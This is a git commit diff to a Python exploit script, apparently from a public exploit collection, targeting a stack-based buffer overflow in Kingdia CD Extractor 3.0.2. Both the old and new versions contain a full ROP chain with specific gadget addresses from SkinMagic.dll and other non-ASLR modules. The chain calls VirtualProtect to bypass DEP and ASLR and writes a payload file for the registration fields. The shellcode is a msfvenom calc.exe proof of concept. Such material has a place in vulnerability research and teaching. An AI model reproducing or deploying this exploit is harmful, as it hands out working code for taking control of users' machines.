a126af93c945fa2d8a6c29b0ff22bc975e2d336d
Angelo F.C <98479572+lem0nSec@users.noreply.github.com>
2022-08-07 15:57:27 +0200

    Update Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py

--- Windows/CVE N\A/Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py
+++ Windows/CVE N\A/Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py
@@ -1,25 +1,11 @@
-# Exploit Title: Kingdia CD Extractor v3.0.2 (DEP + ASLR Bypass)
-# Date: 28/07/2022
-# Exploit Author: Angelo Frasca Caccia
+# Exploit Title: Kingdia CD Extractor 3.0.2 - Stack-based Buffer Overflow (DEP + ASLR Bypass)
+# Date: 30/07/2022
+# Exploit Author: lem0nSec
 # Software Link: https://en.softonic.com/download/kingdia-cd-extractor/windows/post-download
 # Version: 3.0.2
-# Tested on: Windows 7 Professional 64 bit Service Pack 1
+# Tested on: Windows 7 Professional x64 Version 6.1.7601 Service Pack 1 Build 7601 - Windows 10 Home x64 Version 21H2 Build 19044.1766
 
-# NOTES ABOUT THE EXPLOIT CODE
-#------------------------------
-# Kingdia CD Extractor 3.0.2 is vulnerable to a stack-based buffer overflow.
-# The condition can be triggered when sending a large input string as registration code.
-# This exploit generates a "payload.txt". Just launch the application and press the registration
-# button. Then copy the content of the generated .txt file and paste it into the 'User Name' and 
-# 'Registration code' fields.
-
-# NOTES ABOUT THE ROP CHAIN
-#---------------------------
-# This rop chain was developed with VirtualProtect. The vulnerable application comes with two
-# modules (SkinMagic.dll and in_mad.dll) which do not support Address Space Layout Randomization
-# nor are they rebased.
-
-#-----------------------------------------------START---------------------------------------------#
+#!/usr/bin/python
 
 import struct
 import time
@@ -27,372 +13,52 @@ import time
 
 def generate_rop():
 
-    gadgets = [
+    # This ROP Chain calls VirtualProtect
 
-        # padding
-        0x1003A015, # RETN --> SkinMagic.dll
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
-        0x1003A015,
+    # setting EDX register --> 0x40 (PAGE EXECUTE_READWRITE)
+    rop = struct.pack("<I", 0x1003a014) # POP ECX # RETN
+    rop += struct.pack("<I", 0x10021AB6) # random address in skinmagic.dll --> ECX has to point to a valid memory address, otherwise the second instruction of the next gadget will fail
+    rop += struct.pack("<I", 0x1003176a) # XOR EDX,EDX # CMP EAX,DWORD PTR DS:[ECX+8] # SETG DL # MOV EAX,EDX # RETN
+    
+    inc_edx = struct.pack("<I", 0x10032990) # INC EDX # CLD # POP EDI # POP EBX # RETN
+    inc_edx += struct.pack("<I", 0x41414141) # compensate the first pop instruction
+    inc_edx += struct.pack("<I", 0x41414141) # compensate the second pop instruction
 
-        # setting EDX register --> 0x40 (PAGE EXECUTE_READWRITE)
-        0x1003a014, # POP ECX # RETN
-        0x10021AB6, # random address in skinmagic.dll --> ecx has to point to a valid memory address, otherwise the second instruction of the next gadget will likely fail
-        0x1003176a, # XOR EDX,EDX # CMP EAX,DWORD PTR DS:[ECX+8] # SETG DL # MOV EAX,EDX # RETN
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141, # compensate the first pop instruction
-        0x41414141, # compensate the second pop instruction
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
-        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
+    rop += inc_edx*63   # incrementing EDX until it becomes 0x40
 
+    # setting EBX register --> dwSize (0x301)
+    rop += struct.pack("<I", 0x1002e38c) # POP EAX # RETN
+    rop += struct.pack("<I", 0xFFFFFCFF) # 0x301 to negate
+    rop += struct.pack("<I", 0x1001f629) # NEG EAX # RETN
+    rop += struct.pack("<I", 0x601ccfd1) # XCHG EAX,EBX # RETN
 
-        # setting EBX register --> dwSize (0x301)
-        0x1002e38c, # POP EAX # RETN
-        0xFFFFFCFF, # 0x301 to negate
-        0x1001f629, # NEG EAX # RETN
-        0x601ccfd1, # XCHG EAX,EBX # RETN
+    # setting ECX register --> lpOldProtect
+    rop += struct.pack("<I", 0x1003a568) # POP ECX # RETN
+    rop += struct.pack("<I", 0x1004982b) # writable location in SkinMagic.dll
 
-        # setting ECX register --> lpOldProtect
-        0x1003a568, # POP ECX # RETN
-        0x1004982b, # writable location in SkinMagic.dll
+    # setting EDI register --> RETN
+    rop += struct.pack("<I", 0x601de1c9) # POP EDI # RETN
+    rop += struct.pack("<I", 0x1003A015) # gadget to RETN
 
-        # setting EDI register --> RETN
-        0x601de1c9, # POP EDI # RETN
-        0x1003A015, # gadget to RETN
+    # setting EBP register --> POP EBP
+    rop += struct.pack("<I", 0x10028019) # POP EBP # RETN
+    rop += struct.pack("<I", 0x10028019)
 
-        # setting EBP register --> POP EBP
-        0x10028019, # POP EBP # RETN
-        0x10028019,
+    # setting ESI register --> ptr to JMP [EAX]
+    rop += struct.pack("<I", 0x1002e38c) # POP EAX # RETN
+    rop += struct.pack("<I", 0x1003b268) # ptr &VirtualProtect
+    rop += struct.pack("<I", 0x100369a1) # MOV EAX,DWORD PTR DS:[EAX] # RETN
+    rop += struct.pack("<I", 0x601d108f) # XCHG EAX,ESI # RETN
 
-        # setting ESI register --> ptr to JMP [EAX]
-        0x1002e38c, # POP EAX # RETN
-        0x1003b268, # ptr &VirtualProtect
-        0x100369a1, # MOV EAX,DWORD PTR DS:[EAX] # RETN
-        0x601d108f, # XCHG EAX,ESI # RETN
+    # setting EAX register --> &VirtualProtect
+    rop += struct.pack("<I", 0x1002e38c) # POP EAX # RETN
+    rop += struct.pack("<I", 0x1003b268) # ptr &VirtualProtect
 
-        # setting EAX register --> &VirtualProtect
-        0x1002e38c, # POP EAX # RETN
-        0x1003b268, # ptr &VirtualProtect
+    # finalizing the chain with PUSHAD # RETN + JMP ESP
+    rop += struct.pack("<I", 0x601c88c0) # pushad # retn
+    rop += struct.pack("<I", 0x601C9D6B) # jmp esp
 
-        # finalizing the chain with PUSHAD # RETN + JMP ESP
-        0x601c88c0, # pushad # retn
-        0x601C9D6B, # jmp esp
-
-
-        ]
-
-    chain = []
-    for gadget in gadgets:
-        chain.append(struct.pack("<I", gadget))
-    return "".join(chain)
+    return rop
 
 
 def main():
@@ -418,14 +84,15 @@ def main():
     # msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d" -f python
     # bad characters: \x00\x0a\x0d
 
-    rop_chain = generate_rop()
-    
     payload = "A"*268
-    payload += struct.pack("<I", 0x1003A015)    # RETN --> SkinMagic.dll 
-    payload += rop_chain
+    payload += struct.pack("<I", 0x1003A015)        # setting EIP register: RETN (SkinMagic.dll)
+    payload += struct.pack("<I", 0x1003A015)*128    # Padding required before landing on the ROP chain
+    payload += generate_rop()
     payload += "\x90"*8
     payload += shellcode
 
+    print "--> Kingdia CD Extractor 3.0.2 - Stack-based Buffer Overflow Exploit\n"
+    time.sleep(1)
     print "[+] Dropping payload.txt..."
     time.sleep(1)
     f = open("payload.txt", "w")
@@ -435,5 +102,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-  
-#-----------------------------------------------END---------------------------------------------#
+    
